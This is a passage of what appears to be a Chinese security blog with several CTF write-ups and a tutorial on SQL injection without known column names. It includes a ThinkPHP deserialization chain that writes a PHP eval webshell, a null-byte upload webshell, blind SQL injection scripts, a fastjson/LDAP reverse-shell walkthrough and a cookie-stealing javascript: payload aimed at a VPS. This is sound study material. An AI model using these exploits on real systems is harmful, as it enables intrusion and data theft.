null; public $parent; function __construct($output, $modelRelation) { $this-\u0026gt;parent = $output; //$this-\u0026gt;parent=\u0026gt; think\\console\\Output; $this-\u0026gt;append = array(\u0026#34;xxx\u0026#34;=\u0026gt;\u0026#34;getError\u0026#34;); //调用getError 返回this-\u0026gt;error $this-\u0026gt;error = $modelRelation; // $this-\u0026gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==\u0026gt;\u0026gt;HasOne } } } namespace think\\model{ use think\\Model; class Pivot extends Model{ function __construct($output, $modelRelation) { parent::__construct($output, $modelRelation); } } } namespace think\\model\\relation{ class HasOne extends OneToOne { } } namespace think\\model\\relation { abstract class OneToOne { protected $selfRelation; protected $bindAttr = []; protected $query; function __construct($query) { $this-\u0026gt;selfRelation = 0; $this-\u0026gt;query = $query; //$query指向Query $this-\u0026gt;bindAttr = [\u0026#39;xxx\u0026#39;];// $value值，作为call函数引用的第二变量 } } } namespace think\\db { class Query { protected $model; function __construct($model) { $this-\u0026gt;model = $model; //$this-\u0026gt;model=\u0026gt; think\\console\\Output; } } } namespace think\\console{ class Output{ private $handle; protected $styles; function __construct($handle) { $this-\u0026gt;styles = [\u0026#39;getAttr\u0026#39;]; $this-\u0026gt;handle =$handle; //$handle-\u0026gt;think\\session\\driver\\Memcached } } } namespace think\\session\\driver { class Memcached { protected $handler; function __construct($handle) { $this-\u0026gt;handler = $handle; //$handle-\u0026gt;think\\cache\\driver\\File } } } namespace think\\cache\\driver { class File { protected $options=null; protected $tag; function __construct(){ $this-\u0026gt;options=[ \u0026#39;expire\u0026#39; =\u0026gt; 3600, \u0026#39;cache_subdir\u0026#39; =\u0026gt; false, \u0026#39;prefix\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;path\u0026#39; =\u0026gt; \u0026#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php\u0026#39;, \u0026#39;data_compress\u0026#39; =\u0026gt; false, ]; $this-\u0026gt;tag = \u0026#39;xxx\u0026#39;; } } } namespace { $Memcached = new think\\session\\driver\\Memcached(new \\think\\cache\\driver\\File()); $Output = new think\\console\\Output($Memcached); $model = new think\\db\\Query($Output); $HasOne = new think\\model\\relation\\HasOne($model); $window = new think\\process\\pipes\\Windows(new think\\model\\Pivot($Output,$HasOne)); echo urlencode(serialize($window)); } \u0026lt;?php namespace think\\process\\pipes { class Windows { private $files = []; public function __construct($files) { $this-\u0026gt;files = [$files]; //$file =\u0026gt; /think/Model的子类new Pivot(); Model是抽象类 } } } namespace think { abstract class Model{ protected $append = []; protected $error = null; public $parent; function __construct($output, $modelRelation) { $this-\u0026gt;parent = $output; //$this-\u0026gt;parent=\u0026gt; think\\console\\Output; $this-\u0026gt;append = array(\u0026#34;xxx\u0026#34;=\u0026gt;\u0026#34;getError\u0026#34;); //调用getError 返回this-\u0026gt;error $this-\u0026gt;error = $modelRelation; // $this-\u0026gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==\u0026gt;\u0026gt;HasOne } } } namespace think\\model{ use think\\Model; class Pivot extends Model{ function __construct($output, $modelRelation) { parent::__construct($output, $modelRelation); } } } namespace think\\model\\relation{ class HasOne extends OneToOne { } } namespace think\\model\\relation { abstract class OneToOne { protected $selfRelation; protected $bindAttr = []; protected $query; function __construct($query) { $this-\u0026gt;selfRelation = 0; $this-\u0026gt;query = $query; //$query指向Query $this-\u0026gt;bindAttr = [\u0026#39;xxx\u0026#39;];// $value值，作为call函数引用的第二变量 } } } namespace think\\db { class Query { protected $model; function __construct($model) { $this-\u0026gt;model = $model; //$this-\u0026gt;model=\u0026gt; think\\console\\Output; } } } namespace think\\console{ class Output{ private $handle; protected $styles; function __construct($handle) { $this-\u0026gt;styles = [\u0026#39;getAttr\u0026#39;]; $this-\u0026gt;handle =$handle; //$handle-\u0026gt;think\\session\\driver\\Memcached } } } namespace think\\session\\driver { class Memcached { protected $handler; function __construct($handle) { $this-\u0026gt;handler = $handle; //$handle-\u0026gt;think\\cache\\driver\\File } } } namespace think\\cache\\driver { class File { protected $options=null; protected $tag; function __construct(){ $this-\u0026gt;options=[ \u0026#39;expire\u0026#39; =\u0026gt; 3600, \u0026#39;cache_subdir\u0026#39; =\u0026gt; false, \u0026#39;prefix\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;path\u0026#39; =\u0026gt; \u0026#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../public/uploads/images/a.php\u0026#39;, \u0026#39;data_compress\u0026#39; =\u0026gt; false, ]; $this-\u0026gt;tag = \u0026#39;xxx\u0026#39;; } } } namespace { $Memcached = new think\\session\\driver\\Memcached(new \\think\\cache\\driver\\File()); $Output = new think\\console\\Output($Memcached); $model = new think\\db\\Query($Output); $HasOne = new think\\model\\relation\\HasOne($model); $window = new think\\process\\pipes\\Windows(new think\\model\\Pivot($Output,$HasOne)); echo urlencode(serialize($window)); } 文件名的生成规则是：原本的文件名+md5('tag_'+md5($this-\u0026gt;tag))+'.php'，这里的话就是'a.php'+md5('tag_'+md5('xxx'))+'.php'，即a.php12ac95f1498ce51d2d96a249c09c1998.php\n有个小坑，这里的根目录不可写，所以无法成功写马，所以我们换到/public/uploads/images这个目录下面，或者/runtime/temp这个目录也行，最终payload：\n1 /index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A144%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fpublic%2Fuploads%2Fimages%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D 最后执行根目录的readflag即可：\njj\u0026rsquo;s camera 挺有意思的一道题目。\n打开之后的页面是这样的：\n点击生成链接之后底下会生成一个可以跳转的链接：\n但是除了弹出一个框就啥也没了：\n然后点击查看照片也是一直显示没有照片：\n懵了半天，然后拿到Firefox打开的时候，发现它提示我是否允许开启摄像头权限，联想到题目的名字”jj\u0026rsquo;s camera“，把摄像头的权限给了他看看，反正咱也贴了胶布不是。然后会发现他会拍下一张照片并提交给qbl.php，然后跳转到上边填写的链接。\n把上边的串起来，这个网站就是一个钓鱼的后台，生成钓鱼链接，当受害者点击生成的链接并且给了摄像头权限之后就可以拍到受害者的照片并返回给后台。\n这个qbl.php就是接受照片并处理跳转的php，因为名字起的挺奇怪的，所以我们就直接去google它，然后发现网上有源码：\n链接：在吗宝贝？你点开这个网址看看【打开网站偷拍照片】] - 知乎 (zhihu.com)\nqbl.php：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;?php error_reporting(0); $base64_img = trim($_POST[\u0026#39;img\u0026#39;]); $id = trim($_GET[\u0026#39;id\u0026#39;]); $url = trim($_GET[\u0026#39;url\u0026#39;]); $up_dir = \u0026#39;./img/\u0026#39;;//存放在当前目录的img文件夹下 if(empty($id) || empty($url) || empty($base64_img)){ exit; } if(!file_exists($up_dir)){ mkdir($up_dir,0777); } if(preg_match(\u0026#39;/^(data:\\s*image\\/(\\w+);base64,)/\u0026#39;, $base64_img, $result)){ $type = $result[2]; if(in_array($type,array(\u0026#39;bmp\u0026#39;,\u0026#39;png\u0026#39;))){ $new_file = $up_dir.$id.\u0026#39;_\u0026#39;.date(\u0026#39;mdHis_\u0026#39;).\u0026#39;.\u0026#39;.$type; file_put_contents($new_file, base64_decode(str_replace($result[1], \u0026#39;\u0026#39;, $base64_img))); header(\u0026#34;Location: \u0026#34;.$url); } } ?\u0026gt; 注意到服务器的php版本是5.2.17，对代码进行审计，我们可以在id处利用00截断，将后边的png后缀去掉，从而上传shell，payload：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 POST /qbl.php?id=shell.php%00a\u0026amp;url=http://baidu.com HTTP/1.1 Host: node4.buuoj.cn:27340 Content-Length: 106 Cache-Control: max-age=0 Sec-Ch-Ua: \u0026#34;Chromium\u0026#34;;v=\u0026#34;91\u0026#34;, \u0026#34; Not;A Brand\u0026#34;;v=\u0026#34;99\u0026#34; Sec-Ch-Ua-Mobile: ?0 Upgrade-Insecure-Requests: 1 Origin: https://node4.buuoj.cn:27340 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-Dest: document Referer: https://node4.buuoj.cn:27340/sc.php?id=1\u0026amp;url=http://baidu.com Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close img=data%3Aimage%2Fpng%3Bbase64%2CPD9waHAgaGlnaGxpZ2h0X2ZpbGUoX19GSUxFX18pO0BldmFsKCRfUE9TVFtrMXRlXSk7Pz4= 图片会放在img目录下，直接去找就行:\nMisc Just a GIF 将gif逐帧分解之后发现很多冗余图片，每11张一个循环，遂写脚本看看那些地方不同：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import os from PIL import Image if __name__ == \u0026#34;__main__\u0026#34;: # gif逐帧分解 im = Image.open(\u0026#39;Just_a_GIF.gif\u0026#39;) if not os.path.exists(\u0026#39;src\u0026#39;): os.mkdir(\u0026#39;src\u0026#39;) count = 0 try: while True: im.seek(count) im.save(\u0026#39;src/\u0026#39; + str(count) + \u0026#39;.png\u0026#39;) count = count + 1 except: pass print(\u0026#39;帧数\u0026#39; + str(count)) # 找不同 if not os.path.exists(\u0026#39;result\u0026#39;): os.mkdir(\u0026#39;result\u0026#39;) rows = 119 cols = 83 for column in range(11): result = Image.new(\u0026#39;RGBA\u0026#39;,(rows,cols),\u0026#39;black\u0026#39;) for row in range(1,41): origin = Image.open(f\u0026#34;src/{column}.png\u0026#34;).convert(\u0026#39;RGBA\u0026#39;).load() diff = Image.open(f\u0026#34;src/{row*11+column}.png\u0026#34;).convert(\u0026#39;RGBA\u0026#39;).load() for x in range(rows): for y in range(cols): if origin[x,y] != diff[x,y]: result.putpixel((x,y),(255,255,255,255)) result.save(f\u0026#39;result/{column+1}.png\u0026#39;) 得到若干长得像二维码的图片以及两张顺序图，很明显是贴起来了，但是图片右边有黑边，先切掉再拼接：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 from PIL import Image images = [] flag = Image.new(\u0026#39;RGB\u0026#39;,(83*3,83*3)) for i in range(1,10): im = Image.open(f\u0026#34;result/{i}.png\u0026#34;) images.append(im.crop((0,0,83,83))) order = [ [7,1,6], [9,3,4], [5,2,8] ] for row in range(3): for col in range(3): index = order[row][col] flag.paste(images[index-1],(col*83,row*83)) # flag.show() flag.save(\u0026#39;flag.png\u0026#39;) 是个DataMatrix，直接识别即可\n写在最后 其实不能说题目质量不行，只是因为比赛的时候时间紧，所以就只能直接拿网上的payload打，但是赛后再来看看，照着网上的文章，一个函数一个函数跟进，还是能学到很多东西的。\n","date":"2021-08-03T10:42:08+08:00","permalink":"https://k1te.cn/p/dasjuly-x-cbctf-4th-%E9%83%A8%E5%88%86wp/","title":"DasJuly X CBCTF 4th 部分wp"},{"content":"全程被队友们带飞，虽然最后的成绩肯定比不上大佬们的战队，但还是玩的很开心\nWeb Ad Network 左上角有一张图片，点击之后会不停地重定向，我们只需要修改浏览器的重定向次数，然后让浏览器一直跳就可以了：\nAnnouncement 注入点在email处，insert注入，左边的digest是email的md5：\n简单的报错注入，因为不想频繁算md5，于是写了个脚本:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 import requests import hashlib import re session = requests.Session() def genearteMD5(str): # 创建md5对象 hl = hashlib.md5() # Tips # 此处必须声明encode # 否则报错为：hl.update(str) Unicode-objects must be encoded before hashing hl.update(str.encode(encoding=\u0026#39;utf-8\u0026#39;)) return hl.hexdigest() # 数据库 announcement payload = \u0026#34;1\u0026#39;or updatexml(1,concat(0x7e,(database()),0x7e),1) or\u0026#39;\u0026#34; # 表 emails,logs payload = \u0026#34;\u0026#39;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;announcement\u0026#39;),0x7e),0) or\u0026#39;\u0026#34; # 列 log payload = \u0026#34;\u0026#39;or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;logs\u0026#39;),0x7e),0) or\u0026#39;\u0026#34; # 内容 cybrics{1N53r7_0ld_900d_5ql} payload = \u0026#34;\u0026#39;or updatexml(1,concat(0x7e,(select group_concat(log) from logs),0x7e),0) or\u0026#39;\u0026#34; print(\u0026#34;payload: \u0026#34;+payload) captcha = genearteMD5(payload) print(captcha) paramsPost = {\u0026#34;digest\u0026#34;:captcha,\u0026#34;email\u0026#34;:payload} headers = {\u0026#34;Origin\u0026#34;:\u0026#34;http://announcement-cybrics2021.ctf.su\u0026#34;,\u0026#34;Cache-Control\u0026#34;:\u0026#34;max-age=0\u0026#34;,\u0026#34;Accept\u0026#34;:\u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026#34;,\u0026#34;Upgrade-Insecure-Requests\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;User-Agent\u0026#34;:\u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\u0026#34;,\u0026#34;Referer\u0026#34;:\u0026#34;http://announcement-cybrics2021.ctf.su/\u0026#34;,\u0026#34;Connection\u0026#34;:\u0026#34;close\u0026#34;,\u0026#34;Accept-Encoding\u0026#34;:\u0026#34;gzip, deflate\u0026#34;,\u0026#34;Accept-Language\u0026#34;:\u0026#34;zh-CN,zh;q=0.9\u0026#34;,\u0026#34;Content-Type\u0026#34;:\u0026#34;application/x-www-form-urlencoded\u0026#34;} response = session.post(\u0026#34;http://announcement-cybrics2021.ctf.su/\u0026#34;, data=paramsPost, headers=headers) try: print(re.search(\u0026#34;XPATH syntax error: \u0026#39;(.*?)\u0026#39;\u0026#34;,response.text).group()) except: print(response.text) Multichat 点开之后一个网络聊天界面，可以加入不同的room，根据题目描述，我们需要找到tech support和admin所在的房间号，然后向admin发送一段文字即可，所以现在的问题就是如何找到这个房间号，房间号的范围特别大，爆破是不可能爆破的了，还有一个技术支持界面跑在5000端口，点击电话图标即可跳转。\n说实话不是很懂为什么技术支持要填url，但是题就这么出的，刚开始尝试自己的vps，但是一直没有log，然后又尝试填了xss平台的url，还是不行，最后填了pipedream的才终于可以。然后赛后听队友分享的时候发现大家都有发送成功的回显，而我虽然能收到请求，但是页面直接是502。。。自闭。。。接着也不知道该如何测试，后面问了队友才知道可以使用javascript:，然后就去google了一下，找到了一个有点关联的：Call Javascript function from URL/address bar - Stack Overflow，还有篇博客：一个神奇的Javascript运行方式\u0026ndash;URL中的JavaScript - 程序员最后都要送外卖 - 博客园 (cnblogs.com)。大概意思就是在浏览器的地址栏中输入形如：javascript:XXX的语句的时候，浏览器会把后面的xxx当作js执行。这种方法只会被浏览器解释，其他的curl之类的好像不行，所以猜测后台有个bot模拟tech support把我们的url贴到浏览器跑？\n所以我们可以使用payload：javascript:location.href='http://vps/?'+document.cookie来把cookie带出来。\n然后得到房间号拿flag：\nCyber and rebyC Mic Check 签到其实挺有意思的，对前端不是很熟悉，具体不是很清楚怎么实现的，效果就是这段文字看起来是flag，但是直接复制的话是另一段假的flag，不过赛后没了，不然还能研究研究。\nScanner 挺好玩的一道题，用一张动图模拟扫描，然后让你认出这是啥，例如这个小房子：\n思路其实也很简单，只需要把gif一帧一帧拆成png然后再贴起来即可，考虑到，直接贴起来可能会有重复的部分，通过观察大概每隔一张贴起来比较合适，用pillow库写了个脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import os from PIL import Image import requests if __name__ == \u0026#34;__main__\u0026#34;: # 将gif分解成png im = Image.open(\u0026#39;vid.gif\u0026#39;) os.mkdir(\u0026#39;src\u0026#39;) count = 0 try: while True: im.seek(count) im.save(\u0026#39;src/\u0026#39; + str(count) + \u0026#39;.png\u0026#39;) count = count + 1 except: pass print(\u0026#39;帧数\u0026#39; + str(count)) # 将每张png合起来 target = Image.new(\u0026#39;RGB\u0026#39;,(1080,1606)) # 每隔一张图片，截取一定的部分，并且拼接起来 for i in range(0,145,2): img = Image.open(\u0026#39;src/\u0026#39;+ str(i) +\u0026#39;.png\u0026#39;) cropped = img.crop((0,496,1080,517)) target.paste(cropped,(0,i*11)) target.save(\u0026#34;vid.png\u0026#34;) 其实前四个是肉眼看出来的，然后第五个看不出来了，写了个脚本才发现是个二维码，最后扫码即可得到flag：\nCAPTCHA The Flag 刚开始没仔细看，居然不知道该咋做。。。其实很简单，只需要把图片扒拉下来，然后用StegSolve打开，调到特定的通道即可。\n","date":"2021-07-26T14:42:08+08:00","permalink":"https://k1te.cn/p/cybrics2021/","title":"CyBRICS2021"},{"content":"ctf无列名注入小结 其实之前也遇到过类似的题目，但是拖延症太严重了，一直没有仔细研究，正好这次国赛初赛也有一道无列名注入的题目，好好学习一下。\n无列名注入一般伴随着bypass information_schema，当这个表被过滤的时候，我们只能使用sys.schema_auto_increment_columns、sys.schema_table_statistics_with_buffer、mysql.innodb_table_stats等等进行绕过，但是这些表中一般都没有字段名，只能获得表名，所以当我们知道表明之后，还需要进一步地使用无列名注入\n一、列名重复（join……using） 条件：需要开启报错\n直接拿sqli-labs的email表来做演示（后面也会使用这个表）：\n假设我们已经bypass了information_schema并且获得了emails这个表名，这时候我们可以使用?id=1' union select * from (select * from emails a join emails b)c--+dump出第一个字段名：\n紧接着使用?id=1' union select * from (select * from emails a join emails b using(id))c--+dump出第二个字段名：\n一般网上的文章到这里就结束了，但是搞不明白原理是啥（可能是因为我太菜了），所以自己又接着往下研究。\n当我们继续使用?id=1' union select * from (select * from emails a join emails b using(id,email_id))c--+，会报列数不一致的错误：\n因为这个时候已经select成功了，但是只有两列，而union前面的语句有三列，所以列数不一致，在命令行里是可以成功select的：\n或者这样：\n所以join……using到底是啥呢，我又去Google了一下：SQL JOIN 子句用于把来自两个或多个表的行结合起来，基于这些表之间的共同字段。\njoin有不同的类型：\nINNER JOIN：如果表中有至少一个匹配，则返回行 LEFT JOIN：即使右表中没有匹配，也从左表返回所有的行 RIGHT JOIN：即使左表中没有匹配，也从右表返回所有的行 FULL JOIN：只要其中一个表中存在匹配，则返回行 其中inner join 和 join是相同的\nsecurity中还有一个users表如下：\n当我们跨表查询对应用户的email的时候就可以使用join语句，有以下三种写法：\n1 2 3 select * from users join emails on emails.id = users.id; select * from users join emails using(id); select * from users,emails where users.id = emails.id; 我们可以看到当我们使用using的时候id这个字段只出现了一次，但是where和on都出现了两次，并且不会报错。\n但是如果我们在外边套一层select，情况就不一样了\n1 2 3 select * from (select * from users join emails on emails.id = users.id)a; select * from (select * from users join emails using(id))a; select * from (select * from users,emails where users.id = emails.id)a; 可以看到只有using不会报错，其他两个都报了列名重复的错误，并且指出了具体的列名\n假设我们不知道任何列名，把后面的on、using、where都删掉：\n都可以爆出第一个字段（虽然说删了之后前面没有区别），但是当我们知道了第一个字段，想要爆出第二个字段的时候，结果就不一样了。（因为email和user只有一个列名重复，所以join两个一样的表（一般都join一样的表），同时还需要给这两个表取两个别名，不然会报表名不唯一的错误:Not unique table/alias: 'emails'）：\n1 2 3 4 5 6 select * from (select * from emails a join emails b on a.id = b.id)a; \u0026gt;\u0026gt; ERROR 1060 (42S21): Duplicate column name \u0026#39;id\u0026#39; select * from (select * from emails a join emails b using(id))a; \u0026gt;\u0026gt; ERROR 1060 (42S21): Duplicate column name \u0026#39;email_id\u0026#39; select * from (select * from emails a,emails b where a.id = b.id)a; \u0026gt;\u0026gt; ERROR 1060 (42S21): Duplicate column name \u0026#39;id\u0026#39; 可以看到，只有using可以dump出第二个字段，原因想必大家看到这里都明白了，即便我们指定了where和on，select出来的表依然有重复的字段，但是using不会，所以第一个和第三个指令依然报错id字段重复，而第二条指令则开始报剩下的字段的名字。\n二、通过别名，引用列名（需要使用union） 条件：有查询内容回显\n2021国赛初赛的easy_sql之所以不使用这个方法，是因为union被过滤了，所以这也是一个条件吧。\n假设我们不知道emails的字段名，我们可以将他的列名转化为别名：select 1,2 union select * from emails;\n然后我们可以引用这个我们已知的别名来获得数据：select 2 from (select 1,2 union select * from emails)x;：\n当反引号被ban的时候可以使用别名：select a from (select 1,2 a union select * from emails)x;(省略了as)\n或者使用双引号：select a from (select 1,\u0026quot;a\u0026quot; union select * from emails)x;\n在sqli-lab中的演示：\n三、比较盲注 条件：盲注的条件\n上面两种方法要么需要报错，要么需要回显，那么盲注的条件下咋办呢，在知道表名的情况下我们可以先select出想要的内容，然后再构造一个内容与其比较，作为盲注时判断的条件。\n例如：select * from users limit 1;得到：\n我们可以构造select 1,0,0;\n然后与其比较：select (select ((select 1,0,0)\u0026gt;(select * from users limit 1)));\n结果为false，说明1不大于第一个字段的值\n接着：select (select ((select 2,0,0)\u0026gt;(select * from users limit 1)));\n结果为true，说明2大于第一个字段的值，结合上面的可以知道第一个字段的值为1。剩下的以此类推。\n当我准备接着注下去的时候，发现报错了：\n仔细和网上的文章对照了一下，发现payload没有问题，猜测是数据库版本的问题，现在使用的版本是5.5：\n抱着怀疑的心态换了个5.7的mysql，然后顺便创建了一个test表：\n然后继续尝试刚刚的payload：select ((select 1,\u0026quot;f\u0026quot;)\u0026gt;(select * from test limit 1));\n发现可行，应该是某个版本之后这两者可以进行比较，但是具体哪个版本没有进行尝试（又懒又菜），知道的师傅可以和我说一下。\n——————————————————————————\n在数据库中操作完之后开始复盘。\n首先我们得知道表名，这个上边讲过了；其次是得知道这张表中有多少个字段，这个我认为可以通过order by来确定：\n然后得知道有多少行，当大于一行的时候得加上limit不然会报错，永远都返回false，这个只能靠尝试和猜测吧。。。不过flag表一般就一行\n然后就可以进行盲注了：\n1 2 ?id=1\u0026#39; and ((select \u0026#39;1\u0026#39;,0,0)\u0026gt;(select * from users limit 1))--+ ?id=1\u0026#39; and ((select \u0026#39;2\u0026#39;,0,0)\u0026gt;(select * from users limit 1))--+ 结果：\n四、order by盲注 好像没什么合适的环境，等下回遇到再填坑吧，先贴个链接：一道题引发的无列名注入 | ChaBug安全\n最后 我的数据库基础不扎实，如果有什么错误的地方还希望师傅们多多包涵，如果能和我交流，指出我的错误就更好啦\n参考：\n聊一聊bypass information_schema - 安全客，安全资讯平台 (anquanke.com)\ninformation被ban的情况下进行SQL注入 - Cl4y\u0026rsquo;s SecretCl4y\u0026rsquo;s Secret\n无列名注入总结_D1stiny的博客-CSDN博客_无列名注入\n","date":"2021-05-19T22:10:17+08:00","permalink":"https://k1te.cn/p/ctf%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/","title":"ctf无列名注入小结"},{"content":"Ezgame 在网上找到这个游戏的源码，然后在game.js中搜索win关键词，发现当winTimer.IsSet()返回True时，游戏胜利。\n然后在其他文件里找找，就可以在gameEngine.js中找到Timer类的isSet方法：\nIsSet() { return this.endTime \u0026gt; 0; }\n所以我们可以直接在控制台输入：winTimer.endTime = 1\n然而，有大佬直接从网站源码中解出了flag：\n在源码里面找到了一堆奇怪的东西：\n丢到一个在线加密网站，解密得到flag：\ntql\n（原来直接丢到控制台回车就出来了。。。\nrealezjvav[复现] 第一关是一个笛卡尔积注入，其实当时fuzz出来之后发现sleep benchmark RLIKE get_lock都被ban了，只剩笛卡尔积了，奈何还是太菜了，一直没办法延时，最后又跑去想是不是别的方向。。。\n自己写的脚本：（本来想用三个table的组合，会延时1s左右，但是不知道为啥有时候正常的请求会有5s的延时，所以改用两个table加一个column，这样大概会有13秒左右的延时，然后时差\u0026gt;10s即可；time.sleep(0.1)是怕buu的容器429Too Many Requests）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import requests import time url = \u0026#34;http://0ce14b29-a69c-47eb-9aa1-2c0c972e4125.node3.buuoj.cn/user/login\u0026#34; ans = \u0026#34;\u0026#34; for i in range(1, 100): flag = 1 for j in range(31,127): # password：no_0ne_kn0w_th1s payload = \u0026#34;1\u0026#39; and if(ascii(substr(password,\u0026#34;+ str(i) +\u0026#34;,1))\u0026gt;\u0026#34;+ str(j) +\u0026#34;,0,(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.columns C))#\u0026#34; data = {\u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;password\u0026#34;: payload} res = requests.post(url=url, data=data) time.sleep(0.1) # print(payload) print(res.elapsed.total_seconds()) # print(res.status_code) if res.status_code != 200: print(\u0026#34;error \u0026#34;+str(res.status_code)) break if res.elapsed.total_seconds() \u0026gt; 10: if (j != 31): ans += chr(j) flag = 0 break else: break if (flag == 0): print(ans) else: break 登录进去之后是一个头像选择页面，有一个创捷角色功能，burp抓包，传的是json数据：\n然后发现图片的显示是根据：/searchimage?img=2.png，尝试读取flag，但是并不行，因为对java项目的目录结构不清楚，所以啥也读不到，wp里面读取了../../../../../pom.xml，并且在里面找到了fastjson依赖：\n然后根据红队武器库:fastjson小于1.2.68全漏洞RCE利用exp这篇文章进行复现。\n构造恶意java类并起一个http服务 这里用到了34566 34567 34568三个端口，34566是我们反弹shell的监听端口，写在Exploit.java里面（把官方wp的ip改成自己的vps，端口改成34566）；34567是恶意java类的端口，先使用javac Exploit.java生成Exploit.class，然后使用python3 -m http.server 34567起一个http服务：\n然后再浏览器中输入IP地址和端口34567看看有没有开起来：\n如果没有，得把vps防火墙中相应的端口打开。\n开启LDAP服务 34568是ldap服务的端口\ngit clone https://hub.fastgit.org/mbechler/marshalsec.git\n然后cd marshalsec\n接着build（可能需要先sudo apt install maven）：\nmvn clean package -DskipTests\n等待一段时间完成之后会生成一个target目录，cd target\n然后run：\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://xx.xx.xx.xx:34567/#Exploit 34568\n最后nc -lvvp 34566监听我们反弹shell的端口\n用payload攻击题目服务器 在刚刚抓包发送json数据的地方把我们的payload发送过去（使用Unicode编码）：\n然后反弹shell成功，cat即可拿到flag：\n","date":"2021-03-14T01:47:24+08:00","permalink":"https://k1te.cn/p/vnctf2021/","title":"VNCTF2021"},{"content":"大吉大利杯web部分wp 菜炸了，一部分题是自己做出来的，一部分题是看wp复现的\nspaceman php代码审计，源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 \u0026lt;?php error_reporting(0); highlight_file(__FILE__); class spaceman { public $username; public $password; public function __construct($username,$password) { $this-\u0026gt;username = $username; $this-\u0026gt;password = $password; } public function __wakeup() { if($this-\u0026gt;password===\u0026#39;ctfshowvip\u0026#39;) { include(\u0026#34;flag.php\u0026#34;); echo $flag; } else { echo \u0026#39;wrong password\u0026#39;; } } } function filter($string){ return str_replace(\u0026#39;ctfshowup\u0026#39;,\u0026#39;ctfshow\u0026#39;,$string); } $str = file_get_contents(\u0026#34;php://input\u0026#34;); if(preg_match(\u0026#39;/\\_|\\.|\\]|\\[/is\u0026#39;,$str)){ 